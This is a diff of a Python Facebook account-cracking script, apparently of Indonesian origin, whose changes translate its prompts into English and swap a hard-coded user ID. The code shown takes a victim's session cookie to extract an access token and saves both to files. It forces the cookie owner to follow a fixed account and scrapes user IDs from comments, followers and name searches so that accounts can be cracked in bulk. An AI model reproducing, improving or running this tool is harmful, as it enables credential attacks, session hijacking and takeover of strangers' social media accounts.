@@ -227,8 +227,8 @@ def login():
 		
 def login_lagi334():
 	try:
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
-		your_cookies = input(' [+] Masukan Cookie : ')
+		cetak(nel('It is recommended to use cookies that are still fresh to crack accounts',width=90,style=f"bold white"))
+		your_cookies = input(' [+] Enter Cookie : ')
 		with requests.Session() as r:
 			try:
 				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
@@ -239,7 +239,7 @@ def login_lagi334():
 				r.headers.pop('content-type')
 				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
 				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
-				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
+				if 'How do you want to log into Facebook?' in str(response2) or '/login/?next=' in str(response2):
 					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
 				else:
 					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
@@ -276,7 +276,7 @@ def login_lagi334():
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
 							os.system("xdg-open https://chat.whatsapp.com/InwlvDU3t6d9FShXwfH2MV")
-							print("\n [+] Login Berhasil | python BrayennnFB.py");followdong()
+							print("\n [+] Login Successful | python wf.py");followdong()
 			except Exception as e:
 				print(" [+] Cookies Mokad Kontol")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
@@ -293,7 +293,7 @@ def followdong():
 		print(' [+] Cookies Kadaluarsa ')
 		time.sleep(5)
 		login()
-	myuid = ('100001571125775')
+	myuid = ('100005869843255')
 	try:
 		for foll in parser(requests.get(f'https://mbasic.facebook.com/'+myuid,cookies={'cookie':cokies}).text,'html.parser').find_all('a',href=True):
 			if '/a/subscribe.php?' in foll.get('href'):
@@ -354,10 +354,10 @@ def menu(my_name,my_id):
 		time.sleep(5)
 		login()
 	else:
-		print(' [+] choose the right one asu ')
+		print(' [+] choose the right one ')
 		exit()
 def error():
-	print(f' [+] Maaf Fitur Ini Masih Di Perbaiki')
+	print(f' [+] Sorry, this feature is still being fixed')
 	time.sleep(4)
 	back() 
 def siu():
@@ -367,13 +367,13 @@ def siu():
 	
 ###---------[ CRACK DARI KOMEN ]---------- ###
 def komen():
-	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
-	ide = input(f' [+] Masukan Id Postingan : ')
+	cetak(panel(f"Make sure the selected target account is public, not private",width=90,padding=(0,4),style=f"bold white"))
+	ide = input(f' [+] Enter Post ID : ')
 	url = 'https://mbasic.facebook.com/'+ide
 	try:get_komen(url)
 	except KeyboardInterrupt:setting()
 	if len(dump)==0:
-		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
+		print(f" [+] Failed Dump Id, Possible Private Account")
 		time.sleep(3);exit()
 	setting()
 
@@ -386,9 +386,9 @@ def get_komen(url):
 			nama = ids.text
 			if id+"|"+nama in dump:pass
 			else:id.append(id+"|"+nama)
-			sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+			sys.stdout.write(f"\r [+] Gather {len(id)} Idz...");sys.stdout.flush()
 	for z in data.find_all("a",href=True):
-		if "Lihat komentar sebelumnya…" in z.text:
+		if "See previous comments…" in z.text:
 			try:get_komen("https://mbasic.facebook.com"+z["href"])
 			except:pass				
 #-----------------[ TRACK IP ]-----------------# 
@@ -455,7 +455,7 @@ def pengikut():
 	except IOError:
 		exit()
 	ses = requests.Session()
-	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
+	cetak(panel(f"Type 'Me' If You Want To Crack From Your Own Total Followers",width=90,padding=(0,7),style=f"bold white"))
 	akun = console.input(f' [+] Masukan Id Target : ')
 	try:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
@@ -466,20 +466,20 @@ def pengikut():
 			    time.sleep(0.0002)
 			except:continue
 		print("\r")
-		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
+		cetak(panel(f"Collect Successfully {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print(f" [+] Koneksi Internet Anda Bermasalah")
+		print(f" [+] You have a problem with your internet connection")
 		time.sleep(3);exit()
 	except (KeyError,IOError):
-		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
+		print(f" [+] Failed Dump Id, Possible Private Account")
 		time.sleep(3);exit()
 #----------------------[ MENU CRACK LAINNYA ]----------------------#
 def lainnya():
 	cetak(panel(f"[[bold cyan]01[bold white]] Crack Username                   [[bold cyan]03[bold white]] Crack File \n[[bold cyan]02[bold white]] Crack Followers                  [[bold cyan]04[bold white]] Crack Email ",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
 	bray = input(f' [+] Select Menu Crack : ')
 	if bray in(''):
-		print(' [+] choose the right one asu ');back()
+		print(' [+] choose the right one ');back()
 	if bray in('1','01'):
 		crack_nama()
 	elif bray in('2','02'):
@@ -489,15 +489,15 @@ def lainnya():
 	elif bray in('4','04'):
 		crack_email()
 	else:
-		print(' [+] choose the right one asu ')
+		print(' [+] choose the right one ')
 		exit()
 #----------------------[ CRACK USERNAME ]----------------------#
 def crack_nama():
 	nama = []
 	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
 	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
-	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=90,padding=(0,2),style=f"bold white"))
-	nam = console.input(f' [+] Masukan Nama : ').split(",")
+	cetak(panel(f"Crack Username One name you want to crack is equivalent to 3,000 usernames",width=90,padding=(0,2),style=f"bold white"))
+	nam = console.input(f' [+] Enter Name : ').split(",")
 	for ser in nam:		
 		for belakang in custom:
 			id = ser+belakang
@@ -522,9 +522,9 @@ def cari_nama(link):
 			bo = uid+'|'+nama
 			if bo in id:pass
 			else:id.append(bo)
-	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
+	link = r.find('a',string='View Next Results').get('href')
 	if(link):
-	  sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
+	  sys.stdout.write(f"\r [+] Gather {len(id)} Idz ...");sys.stdout.flush()
 	  time.sleep(0.0000004)
 	  cari_nama(link)
 	else:
@@ -587,7 +587,7 @@ def crack_file():
 				lol.update({str(cih):str(isi)})
 				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
 				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
-		geeh = input(' [+] Pilih : ')
+		geeh = input(' [+] Select : ')
 		try:geh = lol[geeh]
 		except KeyError:
 			print(f' [+] Select the right one {x}')
